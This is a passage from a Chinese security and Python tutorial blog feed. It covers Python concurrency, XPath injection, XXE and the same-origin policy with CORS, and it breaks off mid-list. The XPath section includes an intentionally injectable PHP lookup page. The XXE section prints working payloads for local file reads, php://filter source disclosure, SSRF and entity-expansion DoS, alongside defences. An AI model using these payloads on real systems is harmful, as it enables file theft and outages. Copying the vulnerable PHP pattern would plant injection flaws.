class="hljs-string">'__main__'</span>:    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):        t=MyThread()        print(i)        t.start()        t.join()</code></pre><p>调用start时会自动调用类中的run，因此在类中必须定义run</p><p>运行结果</p><pre><code class="hljs txt">0-----0----------1----------2----------relax-----1-----0----------1----------2----------relax-----2-----0----------1----------2----------relax-----</code></pre></li><li><p><strong>互斥锁</strong></p><ul><li>创建锁(默认是不加锁的) mutex=threading.Lock() </li><li>上锁 mutex.acquire()</li><li>解锁 mutex.release()</li><li>判断是否上锁 mutex.locker()</li></ul></li></ol><h2 id="02-multiprocessing实现多进程"><a href="#02-multiprocessing实现多进程" class="headerlink" title="02  multiprocessing实现多进程"></a>02  multiprocessing实现多进程</h2><p>进程与线程的区别：</p><ul><li>进程是资源分配的单位，线程是资源调度的单位</li><li>进程需要的资源多 线程需要的资源少</li><li>进程如同一条流水线 线程如同流水线上的工人</li></ul><ol><li><p><strong>导入模块</strong></p><p>import multiprocessing</p></li><li><p><strong>创建对象</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> multiprocessing<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sing</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):        print(<span class="hljs-string">"------Singing-----"</span>)        time.sleep(<span class="hljs-number">1</span>)        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dance</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):        print(<span class="hljs-string">"------Dancing-----"</span>)        time.sleep(<span class="hljs-number">5</span>)        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>   ts=multiprocessing.Process(target=sing)   td=multiprocessing.Process(target=dance)   ts.start()      td.start()  <span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:    main()</code></pre><p> 运行结果</p> <pre><code class="hljs txt">------Singing-----------Dancing-----------Singing-----------Singing-----------Dancing-----------Dancing-----</code></pre><ul><li><p>调用start后才创建了子进程，子进程从start开始执行，子线程函数结束后子进程运行结束</p></li><li><p>子进程会将主进程的内存复制，复制变量的值。  代码是共享的，不复制 复制的越少越好，能共享就共享</p></li></ul></li><li><p><strong>queue实现进程间通信</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> multiprocessing<span class="hljs-comment"># 模拟下载数据</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">download_data</span><span class="hljs-params">(q)</span>:</span>    data=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]    <span class="hljs-keyword">for</span> temp <span class="hljs-keyword">in</span> data:        q.put(temp)print(<span class="hljs-string">'所有数据已经下载！'</span>) <span class="hljs-comment"># 模拟处理数据</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">data_process</span><span class="hljs-params">(q)</span>:</span>    get_data=list()    <span class="hljs-keyword">while</span> (q.empty()==<span class="hljs-literal">False</span>):        data=q.get()        get_data.append(data)        print(get_data)    print(<span class="hljs-string">'所有数据已经处理完成！'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment">#创建一个队列</span>    q=multiprocessing.Queue()    p1=multiprocessing.Process(target=download_data,args=(q,))    p2=multiprocessing.Process(target=data_process,args=(q,))    p1.start()    p2.start()<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:    main()</code></pre><ul><li><p>queue在内存中开辟空间，储存用于通信的数据</p></li><li><p>queue只能用于同一个电脑的同一个程序</p></li><li><p>不指定队列大小时，根据内存自动确定大小</p></li><li><p>创建进程传递参数时，要注意传递的是一个元组，要加逗号</p></li></ul></li><li><p><strong>进程池</strong></p><p>在任务数不确定时，往往使用进程池</p> <pre><code class="hljs python"><span class="hljs-keyword">import</span> multiprocessing<span class="hljs-keyword">import</span> os,time,random   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">job</span><span class="hljs-params">(msg)</span>:</span>    t_start=time.time()    print(<span class="hljs-string">'%s开始执行，进程号为:%d'</span>%(msg,os.getpid()))    time.sleep(random.random()*<span class="hljs-number">3</span>)    t_stop=time.time()    t_cost=t_stop - t_start    print(<span class="hljs-string">'%s执行执行完毕，耗时%0.2fs'</span> % (msg, t_cost))   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    po=multiprocessing.Pool(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 设置进程池容量为3</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):        po.apply_async(job,(i,))  <span class="hljs-comment"># 两个参数为要执行的函数名和传递参数元组</span>       print(<span class="hljs-string">'----start----'</span>)    po.close()  <span class="hljs-comment"># 关闭进程池</span>    po.join()  <span class="hljs-comment"># 等待池中所有进程执行结束 必须在close之后</span>    print(<span class="hljs-string">'----end----'</span>)   <span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:    main()</code></pre><p>运行结果</p><pre><code class="hljs txt">----start----0开始执行，进程号为:225221开始执行，进程号为:225232开始执行，进程号为:225242执行执行完毕，耗时0.06s3开始执行，进程号为:225240执行执行完毕，耗时1.31s4开始执行，进程号为:225223执行执行完毕，耗时1.80s5开始执行，进程号为:225245执行执行完毕，耗时0.18s6开始执行，进程号为:225246执行执行完毕，耗时0.68s7开始执行，进程号为:225241执行执行完毕，耗时2.81s8开始执行，进程号为:225234执行执行完毕，耗时2.40s9开始执行，进程号为:225227执行执行完毕，耗时1.83s8执行执行完毕，耗时2.60s9执行执行完毕，耗时2.32s----end----</code></pre><ul><li>创建容纳三个进程的进程池去执行九个任务</li><li>进程池使用queue通信时，要使用manager下的queue<br>如q=multiprocessing.Manager().Queue()</li></ul></li></ol><h2 id="03-gevent实现协程"><a href="#03-gevent实现协程" class="headerlink" title="03 gevent实现协程"></a>03 gevent实现协程</h2><ol><li><p>gevent再遇到延时函数时会自动切换协程，但要注意需要使用gevent中的延时函数，如将time.sleep()换成gevent.sleep()<br>如果想要使用原来的延时函数，可以添加语句：</p><pre><code class="hljs python">gevent.monkey.patch_all()</code></pre></li><li><p>启动多个协程的方法</p><pre><code class="hljs python">gevent.joinall(    [        gevent.spawn(f1,<span class="hljs-number">5</span>),        gevent.spawn(f2,<span class="hljs-number">5</span>),        gevent.spawn(f3,<span class="hljs-number">5</span>)  <span class="hljs-comment"># 设置目标函数并传递参数</span>    ])</code></pre><p>协程传递参数使用的不是元组</p></li><li><p>代码示例</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> gevent<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f1</span><span class="hljs-params">(n)</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):        print(<span class="hljs-string">'f1:'</span>,i)        gevent.sleep(<span class="hljs-number">3</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f2</span><span class="hljs-params">(n)</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):        print(<span class="hljs-string">'f2:'</span>,i)        gevent.sleep(<span class="hljs-number">2</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f3</span><span class="hljs-params">(n)</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):        print(<span class="hljs-string">'f3:'</span>,i)        gevent.sleep(<span class="hljs-number">1</span>)gevent.joinall(    [        gevent.spawn(f1,<span class="hljs-number">3</span>),        gevent.spawn(f2,<span class="hljs-number">3</span>),        gevent.spawn(f3,<span class="hljs-number">3</span>)    ])</code></pre><p>运行结果</p><pre><code class="hljs txt">f1: 0f2: 0f3: 0f3: 1f2: 1f3: 2f1: 1f2: 2f1: 2</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xpath注入简介</title>
    <link href="/Xpath%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/"/>
    <url>/Xpath%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>xpath语法和注入漏洞简介</p><a id="more"></a><h1 id="Xpath"><a href="#Xpath" class="headerlink" title="Xpath"></a>Xpath</h1><h2 id="01-Xpath"><a href="#01-Xpath" class="headerlink" title="01 Xpath"></a>01 Xpath</h2><ol><li><p><strong>简介</strong><br>Xpath使用路径表达式来选取 XML 文档中的节点或者节点集</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>Harry Potter<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>J K. Rowling<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>2005<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>29.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span></code></pre><p>在 XPath 中，有七种类型的节点：元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XML 文档是被作为节点树来对待的。树的根被称为文档节点或者根节点</p><p>&lt;bookstore&gt;是文档节点<br>&lt;author&gt;J K. Rowling&lt;/author&gt;是元素节点<br>lang=”en”是属性节点</p></li><li><p><strong>语法</strong></p><p>可以参考<a href="https://www.runoob.com/xpath/xpath-syntax.html" target="_blank" rel="noopener">菜鸟教程</a></p></li></ol><h2 id="02-Xpath注入"><a href="#02-Xpath注入" class="headerlink" title="02 Xpath注入"></a>02 Xpath注入</h2><ol><li><p><strong>原理</strong></p><p>Xpath注入与SQL注入较为类似，只是改为了从xml文档中获取数据，注入的方法仍然是拼接查询语句</p></li><li><p><strong>实例</strong><br>创建一个简单的xml文档验证一下</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--book.xml--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>book-1<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Alice<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>book-2<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Bob<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>book-3<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Eve<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span></code></pre><p>查询页面</p><pre><code class="hljs php"><span class="hljs-comment">//bookguide.php</span><span class="hljs-meta">&lt;?php</span>$xml = simplexml_load_file(<span class="hljs-string">'book.xml'</span>);$id = $_GET[<span class="hljs-string">'id'</span>];$query = <span class="hljs-string">"/bookstore/book[id/text()='"</span>.$id.<span class="hljs-string">"']"</span>;<span class="hljs-keyword">echo</span> $query;$result = $xml-&gt;xpath($query);<span class="hljs-keyword">if</span>($result) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Result:&lt;/h2&gt;'</span>;    <span class="hljs-keyword">foreach</span> ($result <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Author:'</span>.$value-&gt;author;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br /&gt;'</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Price:'</span>.$value-&gt;price;    &#125;&#125;</code></pre><p>传入参数id即可查询对应的信息<br><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>查询出了对应的信息<br><img src="2.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>万能密码</strong></p><p>拼接万能密码，与SQL注入思路类似，但是xml查询没有注释，注意要闭合后边的引号<br>Xpath的函数区分大小写</p><p><strong>第一种万能密码</strong><br><img src="3.png" srcset="/img/loading.gif" alt=""></p><p>查询结果</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>| 相当于SQL查询的union，不能用or替代<br>//* 表示匹配所有节点</p><p><strong>第二种万能密码</strong></p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p><img src="6.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>危害</strong></p><ul><li>绕过登录等验证</li><li>泄露敏感信息</li></ul></li><li><p><strong>防御</strong></p><ul><li>对用户输入进行过滤</li><li>参数化查询</li></ul></li><li><p><strong>自动化利用工具</strong><br>XCat</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>Xpath</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE漏洞简介</title>
    <link href="/XXE%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/XXE%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>XML、DTD、XXE简介</p><a id="more"></a><h1 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h1><h2 id="01-XML基础"><a href="#01-XML基础" class="headerlink" title="01 XML基础"></a>01 XML基础</h2><ol><li><strong>简介</strong></li></ol><p>XML，可扩展标记语言，被设计用来传输和存储数据，XML文档形成了一种树结构，它从根部开始，扩展到枝叶，允许创作者定义自己的标签和自己的文档结构</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don't forget me this weekend<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre><p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头</p><p>note为根节点，to,from,heading,body为枝叶节点</p><p>元素是指包括开始标签到包裹结束标签的部分<br>每个元素又可以有对应的属性，XML属性必须加引号</p><ol start="2"><li><strong>语法规则</strong><ul><li>所有XML元素必须有一个关闭标签（HTML未闭合也可以执行）</li><li>XML标签对大小写敏感（HTML中大小写不敏感）</li><li>XML标签必须正确嵌套</li><li>XML属性值必须加引号</li><li>在XML中，空格会被保留</li><li>XML预定义五个实体引用，即用&amp;lt; , &amp;rt; , &amp;amp; , &amp;apos; , &amp;quote;替换 &lt; &gt; &amp; ‘ “</li></ul></li></ol><h2 id="02-DTD"><a href="#02-DTD" class="headerlink" title="02 DTD"></a>02 DTD</h2><ol><li><p><strong>简介</strong></p><p>DTD，文档类型定义，拥有正确语法的XML被称为形式良好的XML，通过DTD验证的XML是合法的XML</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用</p><p>DTD属性声明语法</p><pre><code class="hljs xml-dtd">&lt;!ENTITY 元素名称 属性名称 属性类型 默认值&gt;</code></pre></li><li><p><strong>实例</strong><br><strong>内部引用DTD</strong><br>&lt;!ENTITY entity-name “entity-value”&gt;</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note[    &lt;!ELEMENT note (to,from,heading,body)&gt;        &lt;!ELEMENT to (#PCDATA)&gt;      &lt;!ELEMENT from (#PCDATA)&gt;      &lt;!ELEMENT heading (#PCDATA)&gt;      &lt;!ELEMENT body (#PCDATA)&gt;  ]&gt;&lt;note&gt;  &lt;to&gt;Tove&lt;&#x2F;to&gt;  &lt;from&gt;Jani&lt;&#x2F;from&gt;  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;  &lt;message&gt;Dont forget me this weekend!&lt;&#x2F;message&gt;&lt;&#x2F;note&gt;</code></pre><pre><code class="hljs xml">   note (to,from,heading,body)表示note元素有四个子元素      to (#PCDATA)表示to元素为#PCDATA类型，即被解析的文本，文本中的标签会被当作标记来处理，而实体会被展开,CDATA是字符数据，标签和实体不会被解析      **外部引用DTD**      \<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">entity-name</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"URI/URL"</span>&gt;</span>      ```xml-dtd   <span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>   <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"note.dtd"</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>Dont forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre><p>note.dtd:</p><pre><code class="hljs dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;    &lt;!ELEMENT to (#PCDATA)&gt;  &lt;!ELEMENT from (#PCDATA)&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;  &lt;!ELEMENT body (#PCDATA)&gt;</code></pre></li></ol><h2 id="03-XXE漏洞"><a href="#03-XXE漏洞" class="headerlink" title="03 XXE漏洞"></a>03 XXE漏洞</h2><ol><li><p><strong>原理</strong><br>XXE漏洞，全称XML外部实体注入漏洞</p><p>应用程序解析XML时，进行外部实体的加载，导致可加载恶意外部文件</p><p>XXE漏洞的出发点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤</p><p>XXE漏洞的产生需要两个条件：</p><ul><li>用户能够控制数据的输入</li><li>程序有拼凑的数据</li></ul></li><li><p><strong>协议</strong></p><p>支持的外部协议：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" srcset="/img/loading.gif" alt="img"></p><p>PHP的扩展协议：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" srcset="/img/loading.gif" alt="img"></p></li><li><p><strong>利用</strong></p><ul><li><p>常用协议：</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://文件绝对路径 如：<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span><span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txtphp://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php</code></pre></li></ul><ul><li><p>读取文本文档：</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE  ANY[&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;flag.txt&quot;&gt;]&gt;&lt;value&gt;$xxe;&lt;&#x2F;value&gt;</code></pre><p>服务器即可显示flag.txt中的内容</p></li><li><p>读取PHP文件：</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE  ANY[&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php&quot;&gt;]&gt;&lt;value&gt;$xxe;&lt;&#x2F;value&gt;</code></pre><p>读取php文件需要进行base64的加密，读取之后再进行解密</p></li><li><p>SSRF</p><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;publicServer.com&#x2F;&quot; [&lt;!ELEMENT data (#ANY)&gt;]&gt;&lt;data&gt;4&lt;&#x2F;data&gt;</code></pre></li><li><p>DoS</p><pre><code class="hljs xml-dtd">&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;&#x2F;data&gt;</code></pre><p>使用了递归的方法</p></li></ul></li><li><p><strong>防御</strong><br>由于libxml2.9.0之后默认不再解析外部实体，XXE漏洞逐渐消亡</p><p>防御方法：</p><ol><li><p>禁用外部实体<br>PHP:</p><pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-keyword">true</span>);</code></pre><p>java:</p><pre><code class="hljs java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="hljs-keyword">false</span>);</code></pre><p>Python:</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="hljs-literal">False</span>))</code></pre></li><li><p>过滤用户的输入，过滤关键字，将实体转义</p></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>同源策略与跨域资源访问</title>
    <link href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE/"/>
    <url>/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p>SOP、CORS、JSONP</p><a id="more"></a><h1 id="同源策略与跨域资源访问"><a href="#同源策略与跨域资源访问" class="headerlink" title="同源策略与跨域资源访问"></a>同源策略与跨域资源访问</h1><h2 id="01-同源策略（SOP）"><a href="#01-同源策略（SOP）" class="headerlink" title="01 同源策略（SOP）"></a>01 同源策略（SOP）</h2><ol><li><p><strong>定义</strong></p><p>同源策略（Same-Origin Policy，SOP）<br>如果两个URL的协议、端口和主机都相同，两个URL就是同源</p><p>如与 <a href="http://a.xxx.com/dir1/test.txt" target="_blank" rel="noopener">http://a.xxx.com/dir1/test.txt</a> 同源的情况：</p><p><a href="http://a.xxx.com/dir2/test.txt" target="_blank" rel="noopener">http://a.xxx.com/dir2/test.txt</a>          路径不同，同源</p><p> <a href="https://a.xxx.com/dir3/test.txt" target="_blank" rel="noopener">https://a.xxx.com/dir3/test.txt</a>         协议不同，不同源</p><p> <a href="http://a.xxx.com:90/dir1/test.txt" target="_blank" rel="noopener">http://a.xxx.com:90/dir1/test.txt</a>    端口不同，不同源</p><p> <a href="http://b.xxx.com/dir1/test.txt" target="_blank" rel="noopener">http://b.xxx.com/dir1/test.txt</a>         主机不同，不同源</p><p><a href="http://xxx.com/dir1/test.txt" target="_blank" rel="noopener">http://xxx.com/dir1/test.txt</a>         主机不同，不同源</p></li><li><p><strong>作用</strong></p><ul><li><p>非同源会受到以下限制：</p><ul><li>cookie、LocalStorage 和 IndexDB不能读取<br>如果两个页面一级域名相同而二级域名不同，可以通过document.domain设置成相同的域名，两个页面 就可以共享cookie，但仍然无法共享LocalStorage和IndexDB</li><li>Dom无法获得</li><li>Ajax请求无法发送</li></ul></li><li><p>不受到限制的：</p><ul><li>页面中的链接，重定向以及表单提交是不会受到同源策略限制的</li><li>js/css/jpg/png等静态文件不会受限制</li></ul></li></ul></li><li><p><strong>跨域的标签</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">applet</span> <span class="hljs-attr">code</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">applet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"..."</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></code></pre></li></ol><h2 id="02-CORS"><a href="#02-CORS" class="headerlink" title="02 CORS"></a>02 CORS</h2><p>跨域资源共享（Cross-origin Resource Sharing，CORS）</p><ol><li><strong>实现过程</strong></li></ol><p>WEB应用程序可以添加HTTP字段确定哪些非同源服务器可以共享资源<br>如请求头中：Origin: <a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 指明了协议、域名和端口</p><p>如果origin的源在许可范围内，服务器就返回一个响应，包含三个字段：<br>Access-Control-Allow-Origin                   内容是请求origin的值或者*<br>Access-Control-Allow-Credenntials        一个布尔值，是否允许发送cookie<br>Access-Control-Expose-Headers            